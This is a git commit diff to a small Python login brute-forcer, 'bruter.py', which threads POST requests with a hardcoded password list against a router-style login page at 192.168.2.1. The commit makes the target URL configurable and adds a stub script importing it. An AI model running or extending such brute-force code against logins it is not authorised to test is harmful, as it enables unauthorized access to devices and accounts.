f5a6eb5429602ec444bc182b01f163d35ada09cd
mantvydas <mantvydo@gmail.com>
2016-03-18 19:46:27 +0000

    - refactoring def signatures - added a reminder to start screating a LM movie checker script

--- bruter.py
+++ bruter.py
@@ -6,13 +6,15 @@ import threading
 class Bruter:
 
     baseUrl = "http://192.168.2.1/"
-    postUrl = baseUrl + "cgi-bin/login.exe"
-    # postUrl = baseUrl + "cgi-bin/logout.exe"
+    loginUrl = baseUrl + "cgi-bin/login.exe"
     passwords = ["d41d8cd98f00b204e9800998ecf8427e", "ef21cdedfaedfad21124ceff", 312545405042, 454545454212454, 89785212477025]
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
-    def __init__(self):
-        print("[!] Starting brutal force on %s" % self.postUrl)
+    def __init__(self, loginUrl=None):
+        if loginUrl:
+           self.loginUrl = loginUrl
+
+        print("[!] Starting brutal force on %s" % self.loginUrl)
         for password in self.passwords:
             time.sleep(1)
             threading.Thread(target=self.attemptLogin, args=[password]).start()
@@ -21,7 +23,7 @@ class Bruter:
         print("[>] Trying %s" % password)
         try:
             parameters = parse.urlencode({"pws": password}).encode("utf8")
-            request_ = request.Request(self.postUrl, data=parameters, headers=self.headers, method="POST")
+            request_ = request.Request(self.loginUrl, data=parameters, headers=self.headers, method="POST")
             response = request.urlopen(request_)
             response = response.read()
 
---
+++ movie_suggestor.py
@@ -0,0 +1,4 @@
+import bruter
+
+def main():
+    print('LM')
